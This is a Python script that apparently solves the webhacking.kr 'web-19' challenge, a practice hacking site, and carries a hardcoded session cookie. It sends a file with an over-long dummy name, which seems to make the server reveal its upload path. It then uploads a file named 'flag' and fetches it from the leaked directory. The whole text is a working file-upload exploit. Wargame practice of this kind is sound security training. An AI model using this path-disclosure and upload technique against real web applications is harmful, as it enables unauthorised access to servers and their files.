from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/web-19/"
COOKIES = {
    "PHPSESSID": "0n7rge2jksvhu5np9cj6futrlk"
}

PAYLOAD = "flag"
DUMMY = "A" * 256

with open(PAYLOAD, "w") as f:
    f.write("test")

file = open(PAYLOAD, "rb")

FILE_UPLOAD = {
    'up': (DUMMY, file)
}

resp = requests.post(url=URL, cookies=COOKIES, files=FILE_UPLOAD)

IDX = resp.text.find("copy(./") + 7

UPLOAD_PATH = resp.text[IDX:IDX + 40]

FILE_UPLOAD['up'] = (PAYLOAD, file)

resp = requests.post(url=URL, cookies=COOKIES, files=FILE_UPLOAD)

resp = requests.get(url=URL + '/' + UPLOAD_PATH + '/' + PAYLOAD, cookies=COOKIES)

print(resp.text)

file.close()
